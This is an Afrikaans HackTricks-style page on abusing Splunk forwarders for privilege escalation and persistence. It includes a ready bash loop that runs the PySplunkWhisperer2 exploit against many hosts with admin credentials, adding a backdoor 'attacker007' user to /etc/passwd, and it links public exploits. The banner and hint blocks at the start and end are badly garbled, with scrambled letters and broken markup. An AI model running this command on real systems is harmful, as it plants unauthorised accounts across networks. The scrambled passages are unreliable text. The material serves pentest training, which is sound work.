# Splunk LPE en Volharding

{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Leer & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Kontroleer die [**subsrippangithub.cm/sorsarlosp!
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Deel truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}

As jy **'n masjien intern of ekstern** op **Splunk wat loop** (poort 8090) **opneem**, en jy weet gelukkig enige **geldige akrediteer** kan jy die **Splunk-diens misbruik** om **'n shell** as die gebruiker wat Splunk uitvoer te **voeren**. As root dit uitvoer, kan jy voorregte na root verhoog.

As jy ook **alreeds root is en die Splunk-diens nie net op localhost luister nie**, kan jy die **wagwoord** lêer **van** die Splunk-diens **steel** en die wagwoorde **breek**, of **nuwe** akrediteer daaraan **toevoeg**. En volharding op die gasheer handhaaf.

In die eerste beeld hieronder kan jy sien hoe 'n Splunkd webblad lyk.



## Splunk Universele Voorouer Agent Exploit Samevatting

Vir verdere besonderhede, kyk die pos [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Dit is net 'n samevatting:

**Exploit Oorsig:**
'n Exploit wat die Splunk Universele Voorouer Agent (UF) teiken, laat aanvallers met die agent wagwoord toe om arbitrêre kode op stelsels wat die agent uitvoer, uit te voer, wat moontlik 'n hele netwerk in gevaar stel.

**Belangrike Punten:**
- Die UF-agent valideer nie inkomende verbindings of die egtheid van kode nie, wat dit kwesbaar maak vir ongeoorloofde kode-uitvoering.
- Algemene wagwoord verkrygingsmetodes sluit in om hulle in netwerk gidse, lêer deel, of interne dokumentasie te vind.
- Suksesvolle uitbuiting kan lei tot SYSTEM of root vlak toegang op gecompromitteerde gashere, data-uitvloeiing, en verdere netwerk infiltrasie.

**Exploit Uitvoering:**
1. Aanvaller verkry die UF-agent wagwoord.
2. Gebruik die Splunk API om opdragte of skripte na die agente te stuur.
3. Mogelijke aksies sluit lêer ekstraksie, gebruikersrekening manipulasie, en stelsel kompromie in.

**Impak:**
- Volledige netwerk kompromie met SYSTEM/root vlak toestemmings op elke gasheer.
- Potensiaal om logging te deaktiveer om opsporing te ontduik.
- Installering van agterdeure of ransomware.

**Voorbeeld Opdrag vir Exploit:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Gebruikbare openbare exploits:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Misbruik van Splunk-vrae

**Vir verdere besonderhede, kyk na die pos [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{% h*nt styCe="Vacceas" %}
AWS Ha& praktyk ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Leer & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Kontroleer die [**subsrippangithub.cm/sorsarlosp!
* Kontroleer die [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Sluit aan 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien aan die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
